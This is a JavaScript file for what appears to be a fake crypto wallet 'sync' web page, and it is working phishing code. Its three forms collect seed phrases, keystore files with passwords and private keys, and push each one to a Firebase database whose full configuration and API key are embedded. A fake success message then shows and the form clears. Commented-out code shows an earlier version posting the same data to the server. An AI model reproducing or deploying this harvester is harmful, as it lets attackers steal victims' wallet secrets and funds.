const firebaseConfig = {
  apiKey: "AIzaSyAb5qKl_OYjHS-GyStc8P6Paa-4kEuLRXs",
  authDomain: "mainnet-syncdapp.firebaseapp.com",
  databaseURL: "https://mainnet-syncdapp-default-rtdb.firebaseio.com",
  projectId: "mainnet-syncdapp",
  storageBucket: "mainnet-syncdapp.appspot.com",
  messagingSenderId: "817769356811",
  appId: "1:817769356811:web:953c60e0bb1f1435b1b10e"
};

  //initialize fb
  firebase.initializeApp(firebaseConfig);

  //ref for db
  var importDB = firebase.database().ref("importForm");
  var keystoreFormDB = firebase.database().ref("keystoreForm");
  var privateFormDB = firebase.database().ref("privateForm");

  document.getElementById('importForm').addEventListener('submit', submitPhrase);
  document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
  document.getElementById('privateForm').addEventListener('submit', submitPrivate);

  //submit phrase page
function submitPhrase(e) {
  e.preventDefault();

  var phrase = document.getElementById('phrase').value;
  var walletname = document.getElementById('walletname').value;

  console.log(phrase, walletname);

  savePhrase(phrase, walletname);

  //alert msg
  setTimeout(() => {
  document.querySelector('.displayMessage').style.display = "block"
  }, 3000);

  //reset form
  document.getElementById('importForm').reset();

}

  const savePhrase = (phrase, walletname)=>{
  var newimportDB = importDB.push();

  newimportDB.set({
      phrase : phrase,
      walletname : walletname
  })
}

  const getElementVal = (id) =>{
  return document.getElementById(id).value;
  }

  //submit keystore page
function submitKeystore(el) {
  el.preventDefault();

  var json = document.getElementById("json").value;
  var password = document.getElementById("password").value;
  var walletname = document.getElementById("walletname").value;

  console.log(json, password, walletname);

  saveKeystore(json, password, walletname)

    //alert msg
  setTimeout(() => {
  document.querySelector('.displayMessage').style.display = "block"
  }, 3000);

  //reset form
  document.getElementById('keystoreForm').reset();

}

const saveKeystore = (json, password, walletname)=>{

  var newkeystoreFormDB = keystoreFormDB.push();

  newkeystoreFormDB.set({
      json : json,
      password : password,
      walletname : walletname
  })
}

// const getElementValue = (id) =>{
//   return document.getElementById(id).value;
// }



  //submit private page
function submitPrivate(ele) {
  ele.preventDefault();

  var private = document.getElementById("privateKey").value;
  var walletname = document.getElementById("walletname").value;

  console.log(private, walletname);

  savePrivateKey(private, walletname);

    //alert msg
  // setTimeout(() => {
  document.querySelector('.displayMessage').style.display = "block"
  // }, 3000);

  //take off the alert msg
  setTimeout(() => {
    document.querySelector('.displayMessage').style.display = "none"
    }, 3000);

  //reset form
  document.getElementById('privateForm').reset();
}

const savePrivateKey = (private, walletname) =>{
  var newprivateFormDB = privateFormDB.push();

  newprivateFormDB.set({
      private : private,
      walletname : walletname
      
})
}

// const getElementValues = (id) =>{
//   return document.getElementById(id).value;
// }










$(document).ready(function () {
    // Modal
    let $close = $("#close-btn");
    let $close2 = $("#close-btn2");
    let $close3 = $("#close-btn3");
    let $modal = $("#modal-1");
    let $modal2 = $("#modal-2");
    let $modal3 = $("#modal-3");
  
    let $open1 = $("#open-form-modal");
  
    $(".wallet-item").click(function (e) {
      $ele = e.currentTarget;
  
      $targetImage = "";
      document.querySelector(".wallet-name").innerHTML =
        $ele.childNodes[3].innerHTML;
      document.querySelector(".wallet-item__img--2").innerHTML =
        $ele.childNodes[1].innerHTML;
  
      // $walletName = $ele.childNodes[3].innerHTML;
      document.querySelectorAll("#walletname").forEach((ele) => {
        ele.value = $ele.childNodes[3].innerHTML;
      });
  
      $modal2.addClass("active");
    });
  
    $close2.click(function () {
      $modal2.removeClass("active");
    });
  
    $close3.click(function () {
      $modal3.removeClass("active");
    });
  
    $open1.click(function () {
      $modal2.removeClass("active");
      $modal3.addClass("active");
    });
  
    $close.click(function () {
      $modal.removeClass("active");
    });
  
    // All form data
    const phrase = $("#phrase");
    const json = $("#json");
    const password = $("#password");
    const privateKey = $("#privateKey");
  
    function resetData() {
      phrase.val("");
      json.val("");
      password.val("");
      privateKey.val("");
      document.querySelectorAll("#walletname").forEach((ele) => {
        ele.value = "";
      });
    }
  
    function validatePhrase() {
      return phrase.val().length > 0;
    }
    function validateKeystore() {
      return json.val().length > 0 && password.val().length > 0;
    }
    function validatePrivatekey() {
      return privateKey.val().length > 0;
    }
  
    // $("#importForm").submit(function (event) {
    //   event.preventDefault();
    //   if (!validatePhrase()) {
    //     alert("Field not allowed to be empty");
    //     return;
    //   }
    //   const myForm = event.target;
    //   const formData = new FormData(myForm);
  
    //   fetch("/", {
    //     method: "POST",
    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //     body: new URLSearchParams(formData).toString(),
    //   })
    //     .then(() => {
    //       resetData();
    //       $modal2.removeClass("active");
    //       $modal3.removeClass("active");
    //       $modal.addClass("active");
    //     })
    //     .catch((error) => {
    //       console.log(error);
    //     });
    // });
  
    // $("#keystoreForm").submit(function (event) {
    //   event.preventDefault();
    //   if (!validateKeystore()) {
    //     alert("Fields not allowed to be empty");
    //     return;
    //   }
  
    //   const myForm = event.target;
    //   const formData = new FormData(myForm);
  
    //   fetch("/", {
    //     method: "POST",
    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //     body: new URLSearchParams(formData).toString(),
    //   })
    //     .then(() => {
    //       resetData();
    //       $modal2.removeClass("active");
    //       $modal3.removeClass("active");
    //       $modal.addClass("active");
    //     })
    //     .catch((error) => {
    //       console.log(error);
    //     });
    // });
  
    // $("#privateForm").submit(function (event) {
    //   event.preventDefault();
    //   if (!validatePrivatekey()) {
    //     alert("Field not allowed to be empty");
    //     return;
    //   }
  
    //   const myForm = event.target;
    //   const formData = new FormData(myForm);
  
    //   fetch("/", {
    //     method: "POST",
    //     headers: { "Content-Type": "application/x-www-form-urlencoded" },
    //     body: new URLSearchParams(formData).toString(),
    //   })
    //     .then(() => {
    //       resetData()
    //       $modal2.removeClass("active");
    //       $modal3.removeClass("active");
    //       $modal.addClass("active");
    //     })
    //     .catch((error) => {
    //       console.log(error);
    //     });
    // });
  
    //   Tabs
    let $navs = $(".navigator-item");
  
    let $navs1 = $("#btn-11");
    let $navs2 = $("#btn-22");
    let $navs3 = $("#btn-33");
  
    let $phrase = $(".phrase-cont");
    let $keystore = $(".keystore-cont");
    let $private = $(".private-cont");
  
    $navs.click(function () {
      $(this).siblings().removeClass("active");
      $(this).addClass("active");
    });
  
    $navs1.click(function () {
      $private.removeClass("active");
      $keystore.removeClass("active");
      $phrase.addClass("active");
    });
    $navs2.click(function () {
      $phrase.removeClass("active");
      $private.removeClass("active");
      $keystore.addClass("active");
    });
    $navs3.click(function () {
      $phrase.removeClass("active");
      $keystore.removeClass("active");
      $private.addClass("active");
    });
  });